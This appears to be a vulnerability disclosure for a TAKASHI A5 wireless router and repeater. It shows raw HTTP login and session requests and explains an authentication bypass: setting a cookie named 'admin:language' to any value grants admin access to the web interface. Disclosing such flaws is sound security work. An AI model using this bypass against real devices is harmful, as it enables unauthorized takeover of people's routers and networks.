#TAKASHI Wireless Instant Router And Repeater Web Application Authentication Bypass<br />
`Software version 	    V5.07.38_AAL03`<br />
`Hardware version 	    V3.0`<br />
`Model no.A5`<br />
This vulnerability is related to how the web application handles sessions for authenticated users. The issue arises due to improper session management, allowing unauthorized users to gain admin-level access.

#Below You Will See A Request Comparison

To understand how this vulnerability works, let's compare an unauthenticated request to an authenticated request.

**An unauthenticated request looks like this:**

POST /LoginCheck HTTP/1.1<br />
Host: 192.168.2.1<br />
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
Accept-Language: en-US,en;q=0.5<br />
Accept-Encoding: gzip, deflate, br<br />
Referer: `http://192.168.2.1/login.asp`<br />
Content-Type: application/x-www-form-urlencoded<br />
Content-Length: 46<br />
Origin: `http://192.168.2.1`<br />
DNT: 1<br />
Sec-GPC: 1<br />
Connection: keep-alive<br />
Cookie: language=en<br />
Upgrade-Insecure-Requests: 1<br />
Priority: u=0, i<br />

Username=admin&checkEn=0&Password=whatsthepassword

**When the user is authenticated, the request looks like this:**<br />

GET /wireless_basic.asp HTTP/1.1<br />
Host: `192.168.2.1`<br />
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
Accept-Language: en-US,en;q=0.5<br />
Accept-Encoding: gzip, deflate, br<br />
Referer: `http://192.168.2.1/advance.asp`<br />
DNT: 1<br />
Sec-GPC: 1<br />
Connection: keep-alive<br />
Cookie: language=en; admin:language=en<br />
Upgrade-Insecure-Requests: 1<br />
Priority: u=4<br />


Key Difference<br />

The key difference between the two requests is the presence of the following cookie:<br />

`admin:language=en`

The Vulnerability<br />

This vulnerability is based on the way the application validates session data. By manipulating the admin:language cookie, an unauthenticated user can gain access to authenticated pages.<br />
Exploit Mechanics

To exploit this vulnerability, all an attacker needs to do is set the cookie admin:language with any arbitrary value. The application will trust this cookie and treat the user as an authenticated admin.

`admin:language=<any_value>`

Where <any_value> can be any string,text or numbers. As long as the cookie is given that name, the application will behave as if the user is authenticated.
Conclusion

This vulnerability shows the importance of proper session management.
